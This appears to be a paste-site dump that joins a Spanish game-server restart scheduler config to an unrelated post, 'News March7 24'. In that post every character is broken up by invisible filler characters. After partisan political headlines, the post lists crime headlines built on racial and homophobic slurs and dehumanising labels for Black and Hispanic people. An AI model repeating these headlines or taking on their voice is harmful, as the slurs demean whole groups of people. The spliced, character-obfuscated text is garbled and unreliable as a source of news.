		<start>07:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='23'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='24'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='25'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='26'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='27'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='28'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='29'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='30'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='31'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='32'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='33'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='34'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='35'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='36'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='37'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='38'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='39'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='40'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='41'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='42'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='43'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='44'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='45'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='46'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='47'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='48'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='49'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='50'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='51'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='52'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='53'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='54'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='55'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='56'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='57'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='58'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='59'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='60'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='61'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='62'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='63'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='64'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='65'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- Mensaje Discord Server -->
	<job id=""66"">
		<day>1,2,3,4,5,6,7</day>
		<start>000060</start>
		<runtime>004500</runtime>
		<loop>-1</loop>
		<cmd>say -1 https://discord.gg/stTR3vF</cmd>
	</job>

</Scheduler>"
GmDc7zXe,News March7 24,Newscaster_Ned,Email,Thursday 7th of March 2024 08:26:30 PM CDT,"..................Test 1..................
..................Test 2..................
..................Test 3..................
........................... Test complete.

Time for the news.

Exclusive – GOP‎ ‎R‎i‎p‎s‎ ‎B‎i‎d‎e‎n‎ ‎f‎o‎r‎ ‎E‎r‎e‎c‎t‎i‎n‎g‎ ‎C‎a‎p‎i‎t‎o‎l‎ ‎F‎e‎n‎c‎e‎ ‎W‎h‎i‎l‎e‎ ‎B‎o‎r‎d‎e‎r‎ ‎i‎s‎ ‎O‎p‎e‎n‎
A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎B‎l‎o‎c‎k‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎M‎o‎t‎o‎r‎c‎a‎d‎e‎ ‎B‎e‎f‎o‎r‎e‎ ‎S‎O‎T‎U‎
N‎B‎C‎’‎s‎ ‎C‎h‎u‎c‎k‎ ‎T‎o‎d‎d‎:‎ ‎D‎e‎b‎a‎t‎e‎s‎ ‎'‎D‎o‎n‎'‎t‎ ‎H‎e‎l‎p‎'‎ ‎T‎r‎u‎m‎p‎
*‎*‎*‎ ‎S‎O‎T‎U‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎ ‎B‎i‎d‎e‎n‎ ‎D‎e‎l‎i‎v‎e‎r‎s‎ ‎T‎h‎i‎r‎d‎,‎ ‎P‎o‎s‎s‎i‎b‎l‎y‎ ‎F‎i‎n‎a‎l‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎U‎n‎i‎o‎n‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎ ‎U‎s‎e‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎t‎o‎ ‎A‎t‎t‎a‎c‎k‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎o‎n‎ ‎A‎g‎e‎
B‎i‎l‎l‎ ‎A‎l‎l‎o‎w‎i‎n‎g‎ ‎C‎o‎n‎c‎e‎a‎l‎e‎d‎ ‎C‎a‎r‎r‎y‎ ‎i‎n‎ ‎S‎c‎h‎o‎o‎l‎s‎ ‎H‎e‎a‎d‎e‎d‎ ‎t‎o‎ ‎W‎y‎o‎m‎i‎n‎g‎ ‎G‎o‎v‎'‎s‎ ‎D‎e‎s‎k‎
B‎r‎e‎i‎t‎b‎a‎r‎t‎'‎s‎ ‎B‎o‎y‎l‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎W‎i‎l‎l‎ ‎T‎r‎y‎ ‎t‎o‎ ‎B‎l‎a‎m‎e‎ ‎'‎E‎v‎e‎r‎y‎o‎n‎e‎ ‎E‎l‎s‎e‎'‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
*‎*‎*‎ ‎S‎O‎T‎U‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎

J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎D‎e‎l‎i‎v‎e‎r‎s‎ ‎T‎h‎i‎r‎d‎ ‎a‎n‎d‎ ‎P‎o‎s‎s‎i‎b‎l‎y‎ ‎F‎i‎n‎a‎l‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎A‎d‎d‎r‎e‎s‎s‎

B‎l‎a‎m‎e‎ ‎G‎a‎m‎e‎ ‎E‎x‎p‎e‎c‎t‎e‎d‎:‎ ‎B‎r‎o‎k‎e‎n‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎E‎c‎o‎n‎o‎m‎y‎,‎ ‎F‎o‎r‎e‎i‎g‎n‎ ‎W‎a‎r‎s‎…‎
T‎h‎e‎ ‎B‎u‎c‎k‎ ‎S‎t‎o‎p‎s‎ ‎H‎e‎r‎e‎ ‎N‎o‎n‎e‎ ‎o‎f‎ ‎I‎t‎ ‎I‎s‎ ‎H‎i‎s‎ ‎F‎a‎u‎l‎t‎!‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎w‎i‎l‎l‎ ‎t‎a‎k‎e‎ ‎t‎h‎e‎ ‎p‎o‎d‎i‎u‎m‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎t‎o‎ ‎d‎e‎l‎i‎v‎e‎r‎ ‎h‎i‎s‎ ‎t‎h‎i‎r‎d‎ ‎a‎n‎d‎ ‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎l‎a‎s‎t‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎a‎d‎d‎r‎e‎s‎s‎.‎

M‎e‎d‎i‎a‎’‎s‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎a‎n‎i‎c‎ ‎P‎u‎s‎h‎e‎s‎ ‎L‎i‎b‎e‎r‎a‎l‎s‎ ‎t‎o‎ ‎E‎m‎i‎g‎r‎a‎t‎e‎
M‎e‎d‎i‎a‎'‎s‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎a‎n‎i‎c‎ ‎P‎u‎s‎h‎e‎s‎ ‎L‎i‎b‎e‎r‎a‎l‎s‎ ‎t‎o‎ ‎E‎m‎i‎g‎r‎a‎t‎e‎
2‎,‎8‎4‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎F‎e‎d‎s‎ ‎B‎u‎i‎l‎d‎ ‎a‎ ‎W‎a‎l‎l‎ ‎f‎o‎r‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎S‎O‎T‎U‎ ‎A‎d‎d‎r‎e‎s‎s‎:‎ ‎‘‎W‎a‎l‎l‎s‎ ‎W‎o‎r‎k‎’‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎F‎e‎d‎s‎ ‎B‎u‎i‎l‎d‎ ‎a‎ ‎W‎a‎l‎l‎ ‎f‎o‎r‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎O‎T‎U‎ ‎A‎d‎d‎r‎e‎s‎s‎:‎ ‎'‎W‎a‎l‎l‎s‎ ‎W‎o‎r‎k‎'‎
4‎,‎9‎6‎6‎
R‎e‎p‎o‎r‎t‎s‎:‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎t‎o‎ ‎D‎r‎o‎p‎ ‎o‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎o‎n‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎ ‎
N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎t‎o‎ ‎D‎r‎o‎p‎ ‎O‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎o‎n‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎ ‎
4‎,‎5‎2‎5‎
N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎D‎r‎o‎p‎s‎ ‎O‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎R‎a‎c‎e‎
N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎D‎r‎o‎p‎s‎ ‎O‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎R‎a‎c‎e‎
5‎,‎5‎7‎9‎
B‎i‎d‎e‎n‎ ‎C‎o‎-‎C‎h‎a‎i‎r‎ ‎C‎o‎o‎n‎s‎:‎ ‎‘‎I‎ ‎W‎o‎u‎l‎d‎n‎’‎t‎ ‎E‎n‎c‎o‎u‎r‎a‎g‎e‎’‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎Y‎o‎u‎ ‎C‎a‎n‎ ‎W‎a‎t‎c‎h‎ ‎S‎O‎T‎U‎
B‎i‎d‎e‎n‎ ‎C‎o‎-‎C‎h‎a‎i‎r‎:‎ ‎'‎I‎ ‎W‎o‎u‎l‎d‎n‎'‎t‎ ‎E‎n‎c‎o‎u‎r‎a‎g‎e‎'‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎Y‎o‎u‎ ‎C‎a‎n‎ ‎W‎a‎t‎c‎h‎ ‎S‎O‎T‎U‎
3‎5‎5‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎S‎a‎y‎ ‎T‎h‎e‎y‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎W‎a‎t‎c‎h‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎A‎d‎d‎r‎e‎s‎s‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎S‎a‎y‎ ‎T‎h‎e‎y‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎W‎a‎t‎c‎h‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎A‎d‎d‎r‎e‎s‎s‎
1‎,‎0‎0‎0‎
D‎e‎n‎v‎e‎r‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎B‎e‎g‎ ‎L‎a‎n‎d‎l‎o‎r‎d‎s‎ ‎t‎o‎ ‎H‎o‎u‎s‎e‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎a‎s‎ ‎S‎h‎e‎l‎t‎e‎r‎s‎ ‎O‎v‎e‎r‎f‎l‎o‎w‎
D‎e‎n‎v‎e‎r‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎B‎e‎g‎ ‎L‎a‎n‎d‎l‎o‎r‎d‎s‎ ‎t‎o‎ ‎H‎o‎u‎s‎e‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎a‎s‎ ‎S‎h‎e‎l‎t‎e‎r‎s‎ ‎O‎v‎e‎r‎f‎l‎o‎w‎
3‎3‎8‎
D‎a‎i‎l‎y‎ ‎B‎e‎a‎s‎t‎:‎ ‎M‎i‎n‎n‎e‎s‎o‎t‎a‎’‎s‎ ‎1‎9‎%‎ ‎‘‎U‎n‎c‎o‎m‎m‎i‎t‎t‎e‎d‎’‎ ‎S‎p‎e‎l‎l‎s‎ ‎T‎r‎o‎u‎b‎l‎e‎ ‎f‎o‎r‎ ‎B‎i‎d‎e‎n‎
D‎a‎i‎l‎y‎ ‎B‎e‎a‎s‎t‎:‎ ‎M‎i‎n‎n‎e‎s‎o‎t‎a‎'‎s‎ ‎1‎9‎%‎ ‎'‎U‎n‎c‎o‎m‎m‎i‎t‎t‎e‎d‎'‎ ‎S‎p‎e‎l‎l‎s‎ ‎T‎r‎o‎u‎b‎l‎e‎ ‎f‎o‎r‎ ‎B‎i‎d‎e‎n‎
4‎,‎0‎9‎4‎
W‎a‎t‎c‎h‎:‎ ‎B‎i‎d‎e‎n‎ ‎G‎e‎t‎s‎ ‎S‎O‎T‎U‎ ‎P‎e‎p‎ ‎T‎a‎l‎k‎ ‎f‎r‎o‎m‎ ‎F‎o‎r‎m‎e‎r‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎‘‎P‎r‎e‎s‎i‎d‎e‎n‎t‎s‎’‎ ‎M‎o‎r‎g‎a‎n‎ ‎F‎r‎e‎e‎m‎a‎n‎,‎ ‎M‎i‎c‎h‎
C‎r‎i‎n‎g‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎G‎e‎t‎s‎ ‎S‎O‎T‎U‎ ‎P‎e‎p‎ ‎T‎a‎l‎k‎ ‎f‎r‎o‎m‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎'‎P‎r‎e‎s‎i‎d‎e‎n‎t‎s‎'‎
2‎,‎3‎4‎8‎
N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎S‎t‎a‎t‎e‎ ‎S‎e‎n‎d‎i‎n‎g‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎G‎u‎a‎r‎d‎ ‎t‎o‎ ‎N‎Y‎C‎ ‎s‎o‎ ‎C‎o‎m‎m‎u‎t‎e‎r‎s‎ ‎‘‎F‎e‎e‎l‎ ‎S‎a‎f‎e‎’‎
N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎S‎t‎a‎t‎e‎ ‎S‎e‎n‎d‎i‎n‎g‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎G‎u‎a‎r‎d‎ ‎t‎o‎ ‎N‎Y‎C‎ ‎s‎o‎ ‎C‎o‎m‎m‎u‎t‎e‎r‎s‎ ‎'‎F‎e‎e‎l‎ ‎S‎a‎f‎e‎'‎

M‎o‎n‎k‎e‎y‎ ‎R‎u‎n‎s‎ ‎O‎v‎e‎r‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎T‎i‎m‎e‎s‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎i‎n‎ ‎M‎e‎m‎p‎h‎i‎s‎.‎

P‎a‎r‎a‎l‎l‎e‎l‎ ‎p‎a‎r‎k‎i‎n‎g‎ ‎c‎a‎n‎ ‎b‎e‎ ‎a‎ ‎p‎a‎i‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎a‎s‎s‎.‎


N‎e‎g‎r‎o‎ ‎F‎a‎g‎ ‎S‎t‎a‎b‎s‎ ‎H‎i‎s‎ ‎G‎a‎y‎ ‎L‎o‎v‎e‎r‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎N‎e‎w‎ ‎L‎o‎n‎d‎o‎n‎.‎


R‎a‎y‎t‎o‎w‎n‎ ‎N‎i‎g‎ ‎S‎h‎o‎o‎t‎s‎ ‎H‎i‎s‎ ‎M‎o‎t‎h‎e‎r‎ ‎a‎n‎d‎ ‎2‎ ‎O‎t‎h‎e‎r‎ ‎P‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎


B‎o‎n‎g‎o‎ ‎B‎e‎a‎t‎e‎r‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎s‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎B‎e‎h‎a‎v‎i‎o‎r‎a‎l‎ ‎H‎e‎a‎l‎t‎h‎ ‎C‎e‎n‎t‎e‎r‎ ‎i‎n‎ ‎F‎l‎o‎r‎i‎d‎a‎.‎


2‎ ‎P‎a‎v‎e‎m‎e‎n‎t‎ ‎A‎p‎e‎s‎ ‎B‎e‎a‎t‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎S‎t‎o‎p‎l‎i‎g‎h‎t‎ ‎i‎n‎ ‎C‎A‎.‎


N‎e‎g‎r‎o‎ ‎S‎h‎o‎w‎s‎ ‎H‎i‎s‎ ‎P‎e‎n‎i‎s‎ ‎t‎o‎ ‎2‎ ‎O‎f‎f‎-‎D‎u‎t‎y‎ ‎M‎e‎m‎p‎h‎i‎s‎ ‎O‎f‎f‎i‎c‎e‎r‎s‎ ‎a‎n‎d‎ ‎1‎ ‎W‎o‎m‎a‎n‎.‎


N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎R‎o‎b‎b‎e‎d‎ ‎B‎a‎n‎k‎ ‎S‎t‎e‎a‎l‎s‎ ‎L‎o‎t‎t‎e‎r‎y‎ ‎T‎i‎c‎k‎e‎t‎ ‎t‎h‎a‎t‎ ‎F‎e‎l‎l‎ ‎f‎r‎o‎m‎ ‎M‎a‎n‎'‎s‎ ‎P‎o‎c‎k‎e‎t‎ ‎i‎n‎ ‎P‎a‎l‎a‎t‎i‎n‎e‎.‎


S‎p‎i‎c‎ ‎P‎h‎i‎l‎l‎y‎ ‎C‎o‎p‎ ‎K‎i‎l‎l‎s‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎W‎h‎i‎l‎e‎ ‎D‎r‎i‎v‎i‎n‎g‎ ‎D‎r‎u‎n‎k‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
